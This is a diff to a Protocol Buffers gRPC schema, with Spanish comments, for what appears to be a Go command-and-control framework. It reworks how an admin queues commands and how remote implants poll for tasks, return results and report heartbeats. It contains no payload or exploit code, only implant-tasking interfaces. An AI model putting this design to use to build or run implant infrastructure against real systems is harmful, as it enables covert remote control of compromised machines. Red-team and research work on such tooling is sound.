@@ -3,34 +3,19 @@ option go_package="github.dev/nireitdev/go-C2-Prana/proto";
 
 //Comandos de Admin/Implant hacia Server
 service Server{
-	rpc AdminTask( TaskRequest ) returns ( TaskResult );
+	rpc AdminNewTask( Task ) returns ( NewTaskResult );
+	rpc AdminGetTask( TaskId ) returns ( Task );
 
-	//Implant cmds:
-	rpc ImplantTask( ImplantRequest) returns ( ImplantResult );
+	//Implant cmds: retorna resultados de trabajos anterioes y recibe nuevos
+	rpc ImplantGetTask( Empty ) returns ( Task );
+	rpc ImplantResultTask( Task ) returns ( Empty );
 	rpc ImplantAlive(AliveMsg) returns (Empty);
 }
 
-//Server "push" comandos hacia Implant
-service PushCommand{
-	rpc PushCmd( PushRequest) returns (PushResult);
+message TaskId {
+	string TaskId = 1;
 }
 
-
-message ImplantRequest {
-	string Request = 1;
-}
-
-message ImplantResult {
-	string Result = 1;
-}
-
-message PushRequest {
-	string Request = 1;
-}
-
-message PushResult {
-	string Result = 1;
-}
 
 message AliveMsg{
 	string ImplantID = 1;
@@ -38,16 +23,16 @@ message AliveMsg{
 	string OS = 3;
 }
 
-message TaskRequest{
-	string TaskID =1 ;
-	string ImplantID =2;
-	string Command  =3;
+message Task {
+		string TaskID =1 ;
+		string ImplantID =2;
+		string Command  =3;
+		TaskStatus Status = 4;
+		string Result  =5;
 }
 
-message TaskResult{
-	string TaskID =1 ;
-	TaskStatus Status = 2;
-	string Result  =3;
+message NewTaskResult{
+	TaskStatus Status = 1;
 }
 
 enum TaskStatus{
@@ -55,6 +40,6 @@ enum TaskStatus{
 	IMPLANTRESPONSEOK = 1;
 	IMPLANTLOST = 2;
 }
-message Empty{
 
+message Empty{
 }
